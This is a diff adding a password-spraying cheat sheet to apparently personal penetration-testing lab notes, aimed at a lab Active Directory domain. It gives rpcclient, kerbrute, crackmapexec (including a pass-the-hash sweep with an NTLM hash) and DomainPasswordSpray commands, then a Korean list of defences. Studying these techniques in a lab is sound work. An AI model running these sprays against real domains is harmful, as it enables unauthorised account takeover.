@@ -118,3 +118,32 @@ sudo make all
 
 kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 ```
+
+## Spraying
+### Linux
+```bash
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
+### Windows
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+### 예방법
+- 다중 인증(MFA) — 모바일 푸시, OTP, RSA 키 등을 활용해 비밀번호가 유출돼도 계정 접근을 차단
+- 접근 제한 — 최소 권한 원칙에 따라 실제로 필요한 사용자에게만 애플리케이션 접근 허용
+- 피해 최소화 — 관리자 계정 분리, 권한 세분화, 네트워크 분리(세그멘테이션)로 침해 범위 제한
+- 비밀번호 위생 — 패스프레이즈 사용 권장, 사전 단어·계절·회사명 등 흔한 조합 필터링으로 추측 어렵게 만들기
